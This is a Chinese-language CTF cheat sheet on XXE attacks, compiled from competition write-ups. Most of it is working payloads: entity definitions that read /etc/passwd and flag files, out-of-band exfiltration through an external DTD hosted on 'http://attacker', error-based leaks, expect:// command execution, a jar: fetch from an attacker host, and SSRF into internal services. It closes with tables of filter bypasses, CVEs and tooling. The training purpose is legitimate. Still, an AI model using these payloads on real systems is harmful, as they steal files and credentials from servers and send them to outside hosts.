# 09-XXE

## 总览

> **通路**: ① 直接执行 / ③ 文件包含 / SSRF 组合\
> **来源**: 1156 篇 WP 提炼（仓库无专文，全部来自实战案例）+ 网络补充

***

## 一、基础：读文件

```xml
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>

```

配合 PHP 伪协议读源码（base64 避免解析错误）：

```xml
<!ENTITY f SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
```

出处: `2022IS河南工业控制.meta.md:47`

***

## 二、Blind XXE / OOB 外带 ★（无回显）

### 2.1 外部 DTD 外带（标准姿势）

**本地 payload**:

```xml
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % xxe SYSTEM "file:///flag">
  <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
  %dtd;
]>
<x>&send;</x>

```

**VPS 上的 evil.dtd**:

```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker/?%xxe;'>">
%all;
```

出处: `2022 SWPUCTF.meta.md:86-95`

### 2.2 报错外带（无回显 + 无法出网）

```xml
<!ENTITY % y '<!ENTITY &#x25; z SYSTEM "file:///flag">'>
%y;
%z;
```

出处: `2022腾讯T-Star.meta.md:38-66`

### 2.3 PHP 伪协议 + 外部 DTD（读源码）

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://ip:3333/%file;'>">
```

出处: `2022柏鹭杯.meta.md:32`、`2024高校运维赛.meta.md:90`

### 2.4 盲 XXE 用 FTP 协议（多行读取）

FTP 协议可绕 "URL 中不能换行" 限制，逐行外带。

***

## 三、XXE → RCE

```xml
<!-- PHP expect 扩展（需安装） -->
<!DOCTYPE x [<!ENTITY f SYSTEM "expect://id">]><x>&f;</x>

<!-- Java 应用: JAR 协议打反序列化 -->
<!DOCTYPE x [<!ENTITY f SYSTEM "jar:http://attacker/evil.jar!/x">]>

<!-- 打本地服务（SSRF 效果） -->
<!DOCTYPE x [<!ENTITY f SYSTEM "http://127.0.0.1:8080/admin">]>
```

***

## 四、组合技

| 组合 | 说明 | 出处 |
| --- | --- | --- |
| **SSRF → XXE** | SSRF 请求返回恶意 XML 注入 DOCTYPE | `Patriot CTF 2024.meta.md:17` |
| **源码泄露 → XXE** | `vi -r index.php.swp` 拿源码找 XML 解析点 | `2024领航杯.meta.md:16` |
| **变量覆盖 → XXE** | PHP `$$key=$value` 写 `user_xml_format` 触发解析 | `ciscn华东南.meta.md:27` |
| **XXE → SSRF** | 用 entity 打内网 Redis/FastCGI | 通用 |

### SSRF → XXE 详细

```plain
?url=http://attacker/get-json
# attacker 返回: <?xml ... <!DOCTYPE ... file:///app/flag.txt>
```

***

## 五、常见入口点

* `Content-Type: application/xml` 的接口
* `Content-Type: text/xml` / `SOAP`
* 接受 XML 的 API（REST / RPC）
* 文件上传解析 XML（docx / xlsx / svg）
* 登录接口解析 XML（SAML）

### 找点技巧

```bash
# 改 Content-Type 看是否解析 XML
# docx/xlsx 解压看 xml
# 找 .swp / .bak 拿源码确认解析逻辑
```

***

## 六、经典 CVE

| CVE | 组件 | 说明 |
| --- | --- | --- |
| **CVE-2018-19968** | phpMyAdmin | XXE 读文件 |
| **CVE-2025-58360** | GeoServer WMS | XXE 漏洞 |
| **CVE-2019-9670** | Zimbra | Autodiscover XXE |
| **CVE-2017-9805** | Struts2 REST | XStream 反序列化（XML 相关） |

出处: 网络补充 [CVE-2025-58360 GeoServer XXE 分析](https://cloud.tencent.com.cn/developer/article/2617074)

***

## 七、防御绕过

| 防护 | 绕过 |
| --- | --- |
| 过滤 `SYSTEM` | 用 `PUBLIC` / 参数实体 |
| 过滤 `ENTITY` | 编码 / 嵌套 |
| 禁用外部实体 | 找未禁用的解析器（不同库行为不同） |
| 只允许白名单 | 找 DTD 回显通道 |

**不同解析器行为**：

* `libxml2`（PHP）：默认解析外部实体（PHP < 8.0）
* `DocumentBuilderFactory`（Java）：默认解析
* Python `lxml`：默认不解析（需手动开）

***

## 八、工具

| 工具 | 用途 |
| --- | --- |
| `XXEinjector` | 自动化 XXE 利用 |
| `oxml_xxe` | 向 docx/xlsx 注入 XXE |
| Burp Collaborator | OOB 外带接收 |
| `dnslog.cn` / `ceye.io` | DNS/HTTP 外带接收 |
